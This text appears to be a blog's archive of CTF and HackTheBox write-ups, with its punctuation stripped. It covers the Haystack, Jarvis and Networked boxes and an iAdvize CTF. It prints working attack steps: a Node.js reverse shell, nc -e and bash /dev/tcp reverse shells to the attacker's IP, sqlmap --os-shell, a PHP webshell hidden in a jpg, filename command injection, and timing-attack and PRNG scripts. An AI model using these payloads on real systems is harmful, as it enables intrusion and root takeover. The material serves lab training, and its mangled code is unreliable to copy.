make progress For now we dont have informations about neither Kibana nor Logstash Lets check Elasticsearch again json hg8archbook http haystackhtb9200 HTTP11 200 OK clustername elasticsearch clusteruuid pjrX7VgSFmJYDxP4tCQg name iQEYHgS tagline You Know for Search version builddate 20180926T133409098244Z buildflavor default buildhash 04711c2 buildsnapshot false buildtype rpm luceneversion 740 minimumindexcompatibilityversion 500 minimumwirecompatibilityversion 560 number 642 Elasticsearch is in version 642 for a build date of September 2018 Thats quite old And indeed after a bit of GoogleFu we stumbled upon CVE201817246 Kibana versions before 643 and 5613 contain an arbitrary file inclusion flaw in the Console plugin An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system More informations are available on CyberArk websitehttpswwwcyberarkcomthreatresearchblogexecutethisiknowyouhaveit and gives us example on how to run this exploit First we need to write a NodeJS reserve shell I used the one found herehttpsgithubcomappseccovulnerableappstreemasternodereverseshellthenodejsreverseshell to the tmphg8js folder js function var net requirenet cp requirechildprocess sh cpspawnbinsh var client new netSocket clientconnect8585 10101010 function clientpipeshstdin shstdoutpipeclient shstderrpipeclient return a Start netcat utility to listen for the reverse shell bash nc l vv p 8585 Listening on any address 8585 Lets now launch the exploit on the local instance of Kibana According to the documentationhttpswwwelasticcoguideenkibanacurrentsettingshtml Kibana runs on port 5601 The default settings configure Kibana to run on localhost5601 We now have every informations needed lets launch our exploit bash curl httplocalhost5601apiconsoleapiserversenseversionSENSEVERSIONapistmphg8js On our netcat the connection appear hg8archbook nc l vv p 8585 Listening on any address 8585 Connection from 1010101053792 id uid994kibana gid992kibana grupos992kibana contextosystemusystemrunconfinedservicets0 Good we are on Kibana user now Lets upgrade our shell to a fully interactive one for easiest work check out this blog posthttpswwwmetahackersproupgradeshelltofullyinteractivettyshell for more informations bash python c import ptyptyspawnbinbash export TERMxterm256color export SHELLbinbash CTRL Z stty raw echofg reset Logstash root Looking around show that optkibana turn out to be empty etcelasticsearch still cant be accessed etclogstash belong to kibana group so we can read the content Lets dig As a reminder Logstash is a tool that collect various logs parses them and writes the parsed data to an Elasticsearch cluster Logstash part of the Elastic Stack integrates data from any source in any format with this flexible open source collection parsing and enrichment pipeline httpswwwelasticcofrproductslogstash Once reading the startupoptions file an information catch the eye bash cat etclogstashstartupoptions user and group id to be invoked as LSUSERlogstash LSGROUPlogstash LSUSERroot LSGROUProot So Logstash will run not as logstash user but as root user We are on the right track The confd folder contains three files According to its contents here what each file do inputconf tell Logstash where to search for logs filterconf filter what data is treated and what is ignored outputconf define what to do with parsed data Lets look first at inputconf and outputconf bash cat inputconf input file path optkibanalogstash startposition beginning sincedbpath devnull statinterval 10 second type execute mode read cat outputconf output if type execute stdout codec json exec command comando According to this config Logstash will every 10 seconds 1 Check for file named logstash in the optkibana folder path optkibanalogstash statinterval 10 second type execute mode read 2 Check the file content for data matching filters a regex defined in filterconf 3 Send the matched data to be executed in background json exec command comando Good it seems we can write any command in a file named optkibanalogstash and it should be run as root Neat But first we have to make sure the command match the filter to be parsed correctly by logstash Lets understand that filter bash cat filterconf filter if type execute grok match message EjecutarscomandossGREEDYDATAcomando Thats a complicated syntax at first look Logstash documentation present grok as Grok is a great way to parse unstructured log data into something structured and queryable So its a kind of regex Lets understand it step by step Ejecutarscomandoss is a simple regex meaning that the file have to begin with this sentence GREEDYDATAcomando is the interresting grok part According to the grok pattern sourcehttpsgithubcomlogstashpluginslogstashpatternscoreblobmasterpatternsgrokpatterns GREEDYDATA correspond to a in regex So basically when given the following line Ejecutar comando id grok will match the line and take the id part and parse it as commando variable to the Logstash output command comando as seen in outputconf Lets put all those informations together and try to get a root shell First as usual lets open a netcat listener bash nc l vv p 4485 Listening on any address 4485 assystdr Then create the file Logstash will take as input optkibanalogstash with the correct content matching the filterconf bash echo bash i devtcp101010104485 01 optkibanalogstashhg8 We then wait a bit and fairly quicky we get an incoming connection as root bash nc l vv p 4485 Listening on any address 4485 assystdr Connection from 10101011549446 bash no hay control de trabajos en este shell roothaystack cat rootroottxt 3f5f727xxxxxxxxxxxx9d92 roothaystack As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"iAdvize CTF 2019","tags":["ctf","iadvize","owasp"],"href":"/posts/iadvize-2019","content":"TODO Description Challenge 1 Protected Area You need to find your way into the protected area 100pts First challenge here Opening the challenge displays the following website Screenshot 20200317 at 20 37 44httpsuserimagesgithubusercontentcom907674776895290fe0b8000688f11ea8b1285fa9a91bab0png Since we are on the first challenge lets try the common usernamepassword combo adminadmin adminpassword admin12456 bash hg8archbook curl httplocalhost8080 d usernameadminpasswordadmin Found Redirecting to hg8archbook curl httplocalhost8080 d usernameadminpasswordpassword FLAGd0 n07 u53 d3f4ul7 p455w0rd5 This challenge is a good reminder to never skip the basics before jumping into complicated attack scenarios References OWASP A6Security MisconfigurationhttpsowasporgwwwprojecttoptenOWASPTopTen2017Top102017A6SecurityMisconfiguration Real Life example Equifax used admin as login and password of a database containing 143 million people recordshttpswwwcnbccom20170914equifaxusedadminfortheloginandpasswordofanonusdatabasehtml Challenge 2 API Playground Web Your bank just exposed a new API and you know you can find something 600pts This second challenge was a bit more tough Its goal was to highlight the issue of timing attack Recon Opening the challenge displays the following website EcoBankhttpsuserimagesgithubusercontentcom907674776970225de299a00692b11ea825a97ed043c6b40png Entering a random a token return a Unauthorized message Checking the Network tab shows that the app make a request to an API Endpoint to check if the token is valid EcoBank APIhttpsuserimagesgithubusercontentcom907674776972355c56eb380692e11ea843198a7f9379ee4png Since the challenge name is API Playground lets focus on this API While quickly checking for random payload on the token parameter we notice something odd bash hg8archbook time curl httplocalhost8080accounttokenhg8 Unauthorized 0292s total bash hg8archbook time curl httplocalhost8080accounttoken1 Unauthorized 10332s total The request with token1 took 10 seconds to execute Looks like if part of the token is valid the server takes more time to process the request Exploitation Knowing this we can create a script to recover valid token based on server response time Here is an example on how to do it in Python python import requests import string token while True for char in stringhexdigit print Trying token formattoken char r requestsgethttplocalhost8080accounttoken formattoken char if relapsedtotalseconds 2 token char printf Found one char Current token token if rstatuscode 401 printf Done Token token printrtext exit Lets now run it and we should be able to recover a valid toke bash hg8archbook python timingpy Found one char Current token 1 Found one char Current token 17 Found one char Current token 179 Found one char Current token 1793 Found one char Current token 17937 Found one char Current token 179379 Found one char Current token 179379a Found one char Current token 179379ac Found one char Current token 179379ac8 Found one char Current token 179379ac82 Found one char Current token 179379ac82f Found one char Current token 179379ac82fb Found one char Current token 179379ac82fbf Found one char Current token 179379ac82fbf6 Found one char Current token 179379ac82fbf6a Found one char Current token 179379ac82fbf6a1 Done Token 179379ac82fbf6a1 FLAG71m1n6 4774ck5 4r3 d4n63r0u5 Challenge 3 Messaging Platform Web 300pt Your company just released their new app They asked you to find all vulnerabilities you can 300pts This 3rd challenge was really interesting and allow me to understand better the inner working and potential weaknesses of JSON Web Tokens JWT Lets dig into it Recon Opening the challenge display the following website ACME websitehttpsuserimagesgithubusercontentcom90767477700081940e55a80695911ea83aa112168c4e21epng Login to the website displays a messages liste with a disabled message box ACME messageshttpsuserimagesgithubusercontentcom907674777000959738f5300695911ea8fc8109f119571d5png From here we can not seems to do anything Removing the disabled property of the textbox and the button doesnt help since the message endpoint return as we could expect it a 401 Unauthorized bash hg8archbook curl httplocalhost8080message d Messagetest Unauthorized If you are familiar with API authorization you probably recognized something interesting while looking at the server response bash hg8archbook curl i httplocalhost8080account d username1238864password12345678 HTTP11 302 Found XPoweredBy Express SetCookie SESSIONeyJhbGciOiJIUzI1NiJ9eyJ1c2VybmFtZSI6IjEyMzg4NjQiLCJwZXJtaXNzaW9ucyI6MH0WM5WEcC0kGtOB3Gm3wsbht2jhxDjPoiciiyBeqeI9A8 Path ContentLength 23 Date Wed 18 Mar 2020 195855 GMT Connection keepalive Found Redirecting to Indeed this SESSION cookie have a particular format three base64 looking strings separated by You guessed it its a JWT token As a reminder JSON Web Token JWT is an open standard RFC 7519 that defines a compact and selfcontained way for securely transmitting information between parties as a JSON object This information can be verified and trusted because it is digitally signed httpsjwtio If you wantneed to learn more about JWT I advise to head up to JWTiohttpsjwtiointroduction website with gives a great introduction of the whys and hows of JSON Web Token The main points you should remember is that 1 JWT token consist of three parts separated by dots like so xxxxxyyyyyzzzzz 2 The first part is the header it define signing algorithm being used such as HMAC SHA256 or RSA json alg HS256 typ JWT 3 The second part is the Payload this is the part where you put your data json id 1234567890 name Hugo company iAdvize 4 The third and last part is the Signature its the signature of the whole JWT token To create the signature part you have to take the base64 encoded header part the encoded payload part a secret only known by the application the algorithm specified in the header and sign that The signature is used to verify the message wasnt changed along the way and in the case of tokens signed with a private key it can also verify that the sender of the JWT is who it says it is For example if you want to use the HMAC SHA256 algorithm the signature will be created in the following way js HMACSHA256 base64UrlEncodeheader base64UrlEncodepayload secret Alright knowing all this lets decode this app token to see what it holds bash echo eyJhbGciOiAiSFMyNTYifQ base64 d alg HS256 bash echo eyJ1c2VybmFtZSI6ICJ0ZXMiLCAicGVybWlzc2lvbnMiOiAwfQ base64 d username hg8 permissions 0 Thats interesting making permission to 1 but how no way to sign Burteforcew no flaw in some JWT libs Challenge 6 Quotes API Its an inspirational API but now it needs to be secure 1000pts This 6th challenge was the hardest one worth 1000pts This challenge aims to highlight the weaknesses of PRNG Pseudorandom Number Generator algorithms Lets dig into it Recon Opening the challenge display the following website quotes apihttpsuserimagesgithubusercontentcom90767477622573639b5a280621d11ea9544cb656817dea6png Entering a username gives us access to an access token for the Quotes API quotes api tokenhttpsuserimagesgithubusercontentcom907674776226109b183cd00621d11ea8f236f8912234297png Lets try it bash hg8archbook curl httplocalhost8080quotephptoken1952540257 Sur le plus haut trne du monde on est jamais assis que sur son boule Booba hg8archbook curl httplocalhost8080quotephptoken1952540257 Ne jamais remettre demain ce quon peut faire une main La fouine The application is quite simple since there is no other endpoints at all We can notice quickly with the file extension php that the app is running PHP this informations will probably comes useful later The quotesphp endpoint doesnt look interesting from here it returns a random quote if the token is valid but nothing else interesting Random Number Generator So far here is the informations we can gather to progress app is running PHP token is random token is always 10 chars long length of the username doesnt impact the length of the token token is always an integer token is random and not increment Next logical step is to check PHP documentation for builtin random generation library The first function we stumble accross is randhttpswwwphpnetmanualenfunctionrandphp Rand Generate a random integer httpswwwphpnetmanualenfunctionrandphp Following the documentation this would mean the app is using the following code to generate a 10 long integer token php php echo rand1000000000 9999999999 3771020782 Doesnt seems like a logical nor practical way to me Lets see if other functions exist The randhttpswwwphpnetmanualenfunctionrandphp php documentation also link to the mtrandhttpswwwphpnetmanualenfunctionmtrandphp function mtrand Generate a random value via the Mersenne Twister Random Number Generator httpswwwphpnetmanualenfunctionmtrandphp Again lets give it a try php php mtsrand92735103 random seed php echo mtrand 1711350997 php echo mtrand 1026457933 php echo mtrand 2036211242 Thats interesting Without any extra parameters the returned value of mtrand is the exact same format of our tokens Ok we now know that this Quotes API is using mtrand to generate a random token Now what While checking the PHP documentation of mtrand we stumble across this warning Caution This function does not generate cryptographically secure values and should not be used for cryptographic purposes What does this mean Wikipedia gives us a little insight of how PRNG works A pseudorandom number generator PRNG also known as a deterministic random bit generator is an algorithm for generating a sequence of numbers whose properties approximate the properties of sequences of random numbers The PRNGgenerated sequence is not truly random because it is completely determined by an initial value called the PRNGs seed httpsenwikipediaorgwikiPseudorandomnumbergenerator If you are unfamiliar with PRNG here are the points you have to remember 1 All PRNG algorithms take an input called seed as starting point This seed is the base number on which an algorithmic formula is applied 2 Then the formula is applied on this seed and the result generated is the randomlooking number 3 The generated number is used as the seed for the next random number generation Check out the C standard library implementation of rand to see how its really done under the hood c static unsigned long int next 1 int randvoid RANDMAX assumed to be 32767 next next 1103515245 12345 return unsigned intnext65536 32768 void srandunsigned int seed next seed With all this knowledge we can start to see where the issue is and we could potentially exploit it right Abusing the API token generation Lets try to imagine how the token generation code in this Quote API works Here is one theory 1 The php mtrand function gets initialized with an hardcoded seed using mtsrand 2 Tokens get generated with mtrand and saved to a database 3 Admin generate the first token for himself and get stored in the database 4 As new users login new pseudorandom tokens get generated and saved to the database If this workflow is correct we could use the weakness of PRNG algorithm to recover the initial seed and thanks to the initial seed we could generate the first few token generated by the app with should correspond to the admin account token giving us privileged access to the API Enough with theory lets get to the point with practice First we will need to generate a large amount of tokens to make the seed bruteforce work as easy and quick as possible Lets write a small Python script to extract large amount of tokens from the Quote API python import requests import re import sys from random import randrange port sysargv1 for i in range0 1000 r requestspostf httpctfoneport data username randrange1000000000 m researchr mtsrand626545 php echo mtrand 531921107 php We have a first token lets try to use it to see if the API return a different output bash hg8archbook curl ctfone41123quotephptoken531921107 FLAGrn6 mu57 n07 b3 pr3d1c74bl3 Mitigations Use CSPRNG for any random that need to be truly random and secure Password reset tokens CSRF tokens Session identifiers Cryptographic primitives Secretunpredictable value generation Reference Owasp CheatSheets Secure Random Number GenerationhttpsgithubcomOWASPCheatSheetSeriesblobmastercheatsheetsCryptographicStorageCheatSheetmdsecurerandomnumbergeneration Not So Random Exploiting Unsafe Random Number Generator UsehttpsinsomniaseccomcdnassetsNotSoRandomExploitingUnsafeRandomNumberGeneratorUsepdf Real Life example Authentication Bypass by abusing Insecure crypto tokens HackerOnehttpshackeronecomreports576504 Predictability of password reset tokenshttpsmediablackhatcombhus12BriefingsArgyrosBHUS12ArgyrosPRNGWPpdf"},{"title":"Jarvis - HackTheBox","tags":["hackthebox","ctf","jarvis","waf","gobuster","sql-injection","sqlmap","phpmyadmin","cve-2018-12613","python","systemctl","service","gtfobins","command-injection"],"href":"/posts/jarvis","content":"Jarvis was a pretty straight forward box and textbook case style While its rated as Medium difficulty I would advise beginners to start with this one It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion First thing first lets add the box IP to the hosts file bash hg8archbook echo 101010143 jarvishtb etchosts Lets go User Flag Recon Lets start with the classic nmap scan bash hg8archbook nmap sV sT sC jarvishtb Starting Nmap 780 httpsnmaporg at 20191016 1916 CEST Nmap scan report for jarvishtb 101010143 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 74p1 Debian 10deb9u6 protocol 20 80tcp open http Apache httpd 2425 Debian httpserverheader Apache2425 Debian httptitle Stark Hotel Service Info OS Linux CPE cpeolinuxlinuxkernel Seems like we have somethig super classic A http port 80 and SSH port 22 service open Opening the httpjarvishtb display the following website Jarvis websitehttpsuserimagesgithubusercontentcom9076747669455558cfd3d80f04f11e994814cdf99eadcfapng Browsing the site shows available rooms food and thats it The only page that looks dynamic is the room description page Lets keep that in mind Out of curiosity I ran gobuster to see if we can find interresting files and directories but nothing special was found bash hg8archbook gobuster dir u httpjarvishtb w SecListsDiscoveryWebContentcommontxt Gobuster v301 by OJ Reeves TheColonial Christian Mehlmauer FireFart htaccess Status 403 htpasswd Status 403 hta Status 403 css Status 301 fonts Status 301 images Status 301 indexhtml Status 200 indexphp Status 200 js Status 301 phpmyadmin Status 301 Maybe the phpmyadmin instance will come useful in the future Oddly enough I could run gobuster without issue while during my first walkthrough I got banned when using any automated scanner and got the following message Hey you have been banned for 90 seconds dont be bad SQL Injection Since we have no other interesting entry point so far lets focus on that room page Looking the url httpjarvishtbroomphpcod1 we immediatly notice the cod1 parameter Lets try some injection here starting with the most common SQL Injection Appending various characters to the cod parameters yield an empty room description Jarvis website cod parameterhttpsuserimagesgithubusercontentcom907674766947239d56a2a80f05211e99af5ff160024847fpng After a few tries we discover that the classical AND 11 payload works Opening httpjarvishtbroomphpcod1 and httpjarvishtbroomphpcod1 AND 11 return the exact same result Jarvis website cod parameter injectionhttpsuserimagesgithubusercontentcom9076747669474493691fe00f05311e98be60a53d6269fc0png Lets automate the process with our favorite SQL injection toolkit SQLMaphttpsqlmaporg A very useful option in our case is osshell with it SQLMap will if possible use the SQL injection to upload and open a reverse shell to the server Lets let SQLMap do all the dirty work for us bash sqlmap u httpjarvishtbroomphpcod6 osshell H 1310stable V httpsqlmaporg 105640 CRITICAL page not found 404 105640 WARNING HTTP error codes detected during run 404 Not Found 2 times ending 105640 20191017 No surprise we get banned here with the same error message Hey you have been banned for 90 seconds dont be bad Lets try different options First adding a delay of 10 seconds between each request with delay10 might not trigger the ban bash hg8archbook sqlmap u httpjarvishtbroomphpcod6 delay10 osshell H 1310stable V httpsqlmaporg 200208 INFO heuristic basic test shows that GET parameter cod might be injectable 200209 INFO GET parameter cod appears to be AND booleanbased blind WHERE or HAVING clause injectable with stringhigh 200210 INFO heuristic extended test shows that the backend DBMS could be MySQL 200235 INFO GET parameter cod appears to be MySQL 5012 AND timebased blind query SLEEP injectable 200237 INFO GET parameter cod is Generic UNION query NULL 1 to 20 columns injectable sqlmap identified the following injection points with a total of 73 HTTPs requests Parameter cod GET Type booleanbased blind Title AND booleanbased blind WHERE or HAVING clause Payload cod6 AND 23042304 Type timebased blind Title MySQL 5012 AND timebased blind query SLEEP Payload cod6 AND SELECT 4682 FROM SELECTSLEEP5PeAe Type UNION query Title Generic UNION query NULL 7 columns Payload cod3361 UNION ALL SELECT NULLNULLNULLCONCAT0x71767a70710x4d496842456c564972414349534c7467674866537166477a644d4f456341536d64537751666357790x716b626a71NULLNULLNULL VXEr 200240 INFO the backend DBMS is MySQL backend DBMS MySQL 5012 200240 INFO going to use a web backdoor for command prompt 200240 INFO fingerprinting the backend DBMS operating system 200240 INFO the backend DBMS operating system is Linux 200241 WARNING unable to automatically retrieve the web server document root what do you want to use for writable directory 200244 INFO trying to upload the file stager on varwwwhtml via LIMIT LINES TERMINATED BY method 200245 INFO the file stager has been successfully uploaded on varwwwhtml httpjarvishtb80tmpuhbexphp 200245 INFO the backdoor has been successfully uploaded on varwwwhtml httpjarvishtb80tmpbmblqphp 200245 INFO calling OS shell To quit type x or q and press ENTER osshell id command standard output uid33wwwdata gid33wwwdata groups33wwwdata Jackpot Note We could also have used useragent to avoid using the default sqlmap user agent that can get easily detected by WAF We have a PHP shell running as wwwdata For ease of use I open a netcat reverse shell and close the php shell opened by SQLMap bash hg8archbook nc l vv p 8585 Listening on any address 8585 bash hg8archbook Back to the SQLMapPHP reverse shell osshell nc e binsh 10101010 8585 And surely we get the connection bash hg8archbook nc l vv p 8585 Listening on any address 8585 Connection from 10101014354336 id uid33wwwdata gid33wwwdata groups33wwwdata Note As a reminder you can use the following magic trick to upgrade your shell to a fully interactive one bash In reverse shell python c import pty ptyspawnbinbash CtrlZ hg8archbook In Attacker console hg8archbook stty raw echo hg8archbook fg In reverse shell reset export SHELLbash export TERMxterm256color stty rows columns Pivot wwwdata user pepper Alright so now we have shell on the wwwdata user Lets try to move to the user to find the first flag Looking around the webapp files we find the database credentials bash wwwdatajarvisvarwwwhtml cat connectionphp We can try to connect using the phpmyadmin instance Jarvis phpmyadmin instancehttpsuserimagesgithubusercontentcom907674767007518e0bb6580f0e711e99b1bf01b364b2926png But turn out there is nothing interesting there Only a empty flag database probably a joke by one of the users Lets move on To make the recon task easier we are going to use the Linux enumeration toolhttpsgithubcomdiegotreitoslinuxsmartenumeration For the transfer of the script we will setup a simple http server on our attacking machine bash hg8archbook wget httpsgithubcomdiegotreitoslinuxsmartenumerationrawmasterlsesh O lsesh hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 wget 101010108000lsesh O tmplsesh 20191017 080049 527 KBs tmplsesh saved 3173631736 Lets run the script to see if we can find anything intesrresting bash bash tmplsesh sudo sud000 Can we sudo without a password nope sud010 Can we list sudo commands without a password yes Matching Defaults entries for wwwdata on jarvis envreset mailbadpass securepathusrlocalsbinusrlocalbinusrsbinusrbinsbinbin User wwwdata may run the following commands on jarvis pepper ALL NOPASSWD varwwwAdminUtilitiessimplerpy file system fst020 Uncommon setuid binaries yes binsystemctl FINISHED We notice two very distinctive configurations here First of all the script varwwwAdminUtilitiessimplerpy can be run as user pepper without password through sudo This simplerpy script will be our entry point to pivot to the pepper user Second we notice that systemctl binary at the setuid bit set As a reminder SETUID is special permission attributes in Unix and Unixlike systems they allow unprivileged users to run programs with elevated privileges Here systemctl will always be run at root bash ls l binsystemctl rwsrx 1 root pepper 174520 Feb 17 2019 binsystemctl Lets keep that in mind for the privilege escalation later Alright with all of that in mind lets investigate this simplerpy script to see how we can abuse it to pivot to the pepper user bash ls l total 8 rwxrr 1 pepper pepper 4587 Mar 4 2019 simplerpy The file is owned by pepper user and we have no right to edit it We will need to find a vulnerabiility in the script Upon opening it we can see its used to show statistics about attackers IP and to ping those IP The function to ping catch the attention because of the use of ossystem python def execping forbidden command inputEnter an IP for i in forbidden if i in command printGot you exit ossystemping command ossystemping command clearly open a command injection vulnerability However the script author seems to be aware of the issue and blacklisted a few common characters used in command injection So we cant easily inject command But then what about command substitution According to the bash manual bash hg8archbook man bash Command Substitution Command substitution allows the output of a command to replace the command name There are two forms command or command While the is blacklisted neither or is Lets try to subsitate then bash ironhackerses Enter an IP id ping groups1000pepper Temporary failure in name resolution Awseome lets use this to open a reverse shell bash hg8archbook nc l vv p 8544 Listening on any address 8544 echo nc e binsh 10101010 8544 tmphg8sh sudo u pepper varwwwAdminUtilitiessimplerpy p ironhackerses Enter an IP bash tmphg8sh And surely enough we get our shell bash hg8archbook nc l vv p 8544 Listening on any address 8544 Connection from 10101014357986 pepperjarvis id uid1000pepper gid1000pepper groups1000pepper pepperjarvis cat usertxt 2afxxxxxxxxxxxxxxc44f Root Flag Recon Note To make it easier I added my ssh pub key to authorizedkeys to connect to the pepper account by SSH bash echo sshrsa XXXXX sshauthorizedkeys The recon phase will be quick here since we already a very valuable information in the user recon phase binsystemctl have the SUID bit set bash ls l binsystemctl rwsrx 1 root pepper 174520 Feb 17 2019 binsystemctl This mean that if we manage to make systemctl run a command for us this one will be automatically run as root user Systemctl privilege escalation For this kind of need GTFOBinshttpsgtfobinsgithubio is an incredibly useful project GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells escalate or maintain elevated privileges transfer files spawn bind and reverse shells and facilitate the other postexploitation tasks And surely enough there is informations and even an example for systemctl It runs with the SUID bit set and may be exploited to access the file system escalate or maintain access with elevated privileges working as a SUID backdoor If it is used to run sh p omit the p argument on systems like Debian TF hg8archbook systemctl link TF hg8archbook systemctl enable now TF And since everything went fine we get our shell bash hg8archbook nc l vv p 8585 Listening on any address 8585 Connection from 10101014335734 rootjarvis rootjarvis cat rootroottxt d41dxxxxxxxxxxxxxxx71 Hope this was clear enough as always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Networked - HackTheBox","tags":["hackthebox","ctf","networked","gobuster","php","upload","webshell","weevely","filtering","command-injection","sudo","ifcfg"],"href":"/posts/networked","content":"Networking was an interesting box Focused on coding mistakes rather than exploit or misconfiguration First thing first lets add the box IP to the hosts file bash hg8archbook echo 101010146 networkedhtb etchosts Lets go User Flag Recon Lets start with the classic nmap scan bash hg8archbook nmap sV sT sC networkedhtb Starting Nmap 780 httpsnmaporg at 20191019 1947 CEST Nmap scan report for networkedhtb 101010146 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 74 protocol 20 80tcp open http Apache httpd 246 CentOS PHP5416 httpserverheader Apache246 CentOS PHP5416 443tcp closed https Seems like we have something super classical A http port 80 and SSH port 22 service open Opening httpnetworkedhtb display the following message Hello mate were building the new FaceMash Help by funding us and be the new TylerCameron Join us at the pool party this Sat to get a glimpse No useful informations in this message Lets continue our recon phase with a HTTP enumeration As usual use gobuster I add the x php parameter to make sure we get all files with this extension bash hg8archbook gobuster dir u httpnetworkedhtb w SecListsDiscoveryWebContentbigtxt x php Gobuster v301 by OJ Reeves TheColonial Christian Mehlmauer FireFart htaccess Status 403 htaccessphp Status 403 htpasswd Status 403 htpasswdphp Status 403 backup Status 301 cgibin Status 403 indexphp Status 200 libphp Status 200 photosphp Status 200 uploadphp Status 200 uploads Status 301 The backup endpoint is promising Once opening it we find an archive Networked backup pagehttpsuserimagesgithubusercontentcom907674767149664317cbb00f2ae11e9961d579ad1cdd818png Lets download it and check whats inside bash hg8archbook wget httpnetworkedhtbbackupbackuptar 20191019 195746 656 MBs backuptar saved 1024010240 hg8archbook tar xvf backuptar indexphp libphp photosphp uploadphp Its a backup of the website Seems like gobuster did a good job since it already found each of those files Upon investigating the file we find that uploadphp is well a upload page It accepts only image and part of the code that check the validity of the sent file is written in libphp alongside various functions photosphp is used to display uploaded images First thing that come to mind here is to try to upload a php webshell through the uploadphp page Lets check the rules that validate if a file is valid or not php if checkfiletypeFILESmyFile filesizeFILESmyFiletmpname 60000 echo Invalid image file php function checkfiletypefile mimetype filemimetypefile if strposmimetype image 0 return true else return false The first check consist in a MIME typehttpsdevelopermozillaorgenUSdocsWebHTTPBasicsofHTTPMIMEtypes check of the file If the file MIME type doesnt contain image it will be defined as invalid This check means that the image will be validated locally so no request edition will help to smuggle a PHP Shell by editing ContentType header for example Scrolling through the code we notice a second check php validext arrayjpg png gif jpeg valid false foreach validext as vext if substrcomparemyFilename vext strlenvext 0 valid true This one check do compare the end of the filename to see if it end with the common jpg png gif and jpeg If not the file is defined invalid and not uploaded Alright with all those information in mind lets try to craft one malicious image File upload vulnerability Bypass First Check MIME Type The easiest way to do so is to take a valid image and append the malicious content at the end of the file It can be done in various way Here how I did bash hg8archbook Download most basic jpg image possible hg8archbook wget httpsrawgithubusercontentcommathiasbynenssmallmasterjpegjpg O hg8jpeg hg8archbook echo hg8jpeg hg8archbook cat hg82jpeg C Bypass Second Check File extension A common vulnerability in php file upload form is the double extension In Apache a php file might be executed using the double extension technique such as filephpjpg Unrestricted File UploadhttpswwwowasporgindexphpUnrestrictedFileUpload And thats exactly what we are going to do The second check will pass because our file extension will be jpg but the php code inside will still get executed bash hg8archbook mv hg8jpg hg8phpjpg We are ready to upload now Everything seems to went fine since we get the following message file uploaded refresh gallery The gallery is the photosphp endpoint Opening this page display a list of recently uploaded files and one with the phpjpg extension get the attention In the uploadphp file we got information about the location of stored images php defineUPLOADDIR varwwwhtmluploads We have the location of the upload folder and the name of the file Lets open it Mine is at httpnetworkedhtbuploads101015101phpjpg Networked uploadhttpsuserimagesgithubusercontentcom90767476715007550318080f2b311e9819526034691deebpng Pivot PHP Webshell User Now that we have a working process lets replace the phpinfo by a webshell and we can easily land a shell running as apache user bash networkedhtbvarwwwhtmluploads id uid48apache gid48apache groups48apache The first thing I do after landing a webshell is to check the etcpassword file to find the user we will need to pivot to for finding our flag bash networkedhtbvarwwwhtmluploads cat etcpasswd rootx00rootrootbinbash gulyx10001000gulyhomegulybinbash Beside root the only user to have a shell setup is guly Its our new target First we will check if guly have any interesting file in his home folder bash ls l homeguly total 16 rrr 1 root root 782 Oct 30 2018 checkattackphp rwrr 1 root root 44 Oct 30 2018 crontabguly rw 1 guly guly 770 Oct 19 1828 deadletter r 1 guly guly 33 Oct 30 2018 usertxt The flag is indeed there upon various other files We can see two interresting files in guly home foler A crontab file and a php script bash cat homegulycrontabguly 3 php homegulycheckattackphp The cronjob run the checkattackphp script every 3 minutes We dont have write access to the script so we are not able to edit it to inject command Since we have read access lets investigate to see if we can find a vulnerability in the runtime php value execrm f logpath execnohup binrm f pathvalue devnull 21 echo rm f pathvaluen mailto msg msg headers Fvalue Three exec calls we will surely find a way to inject something First exec execrm f logpath cant do anything since logpath is harcoded Second exec execnohup binrm f pathvalue devnull 21 is already more interesting Reading thought the code we understand that value is dynamically fetched from the filenames of files present in the varwwwhtmluploads folder For example with our previously uploaded image file hg8phpjpg the executed command will be php execnohup binrm f varwwwhtmluploadshg8phpjpg devnull 21 So if we are a file named for example sleep 5 here is what the executed command will be php execnohup binrm f varwwwhtmluploads sleep 5 devnull 21 Since we have write access to the varwwwhtmluploads folder lets try it out with a reverse shell Firstly lets open our listener bash hg8archbook nc l vv p 8544 Listening on any address 8544 And lets create our malicious file bash networkedhtbvarwwwhtmluploads touch nc 10101010 8544 c bash We wait a little bit for the cronjob to run and surely a new connection open on our listener bash hg8archbook nc l vv p 8544 Listening on any address 8544 Connection from 10101014652024 gulynetworked id uid1000guly gid1000guly groups1000guly gulynetworked cat usertxt 526cxxxxxxxxxxx1c5 Root Flag Recon To make the recon task easier we are going to use the Linux enumeration toolhttpsgithubcomdiegotreitoslinuxsmartenumeration For the transfer of the script we will setup a simple http server on our attacking machine bash hg8archbook wget httpsgithubcomdiegotreitoslinuxsmartenumerationrawmasterlsesh O lsesh hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 gulynetworked wget 101010108000lsesh O tmplsesh 20191017 080049 527 KBs tmplsesh saved 3173631736 Lets run the script to see if we can find anything intesrresting bash gulynetworked bash tmplsesh sudo sud000 Can we sudo without a password nope sud010 Can we list sudo commands without a password yes User guly may run the following commands on networked root NOPASSWD usrlocalsbinchangenamesh FINISHED We notice a very interesting configuration here The script usrlocalsbinchangenamesh can be run as root without password through sudo If we can edit or find a flaw in this script it will be our pass to the root flag bash gulynetworked tmp ls l usrlocalsbinchangenamesh rwxrxrx 1 root root 422 Jul 8 1234 usrlocalsbinchangenamesh Without surprise we can not write in the file Lets investigate to check if we can find a flow in its working bash gulynetworked cat usrlocalsbinchangenamesh binbash p cat etcsysconfignetworkscriptsifcfgguly etcsysconfignetworkscriptsifcfgguly done sbinifup guly0 The script take various user input to set them in a network configuration file etcsysconfignetworkscriptsifcfgguly At the end the sbinifup guly0 apply the new configuration networkscript privilege escalation This one was new for me while searching for informations about networkscript I stumbled across this SecList RedhatCentOS root through networkscripts If for whatever reason a user is able to write an ifcf script to etcsysconfignetworkscripts or it can adjust an existing one then your system in pwned In my case the NAME attributed in these network scripts is not handled correctly If you have whiteblank space in the name the system tries to execute the part after the whiteblank space Which means everything after the first blank space is executed as root For example etcsysconfignetworkscriptsifcfg1337 NAMENetwork binid ONBOOTyes DEVICEeth0 Yes any script in that folder is executed by root because of the 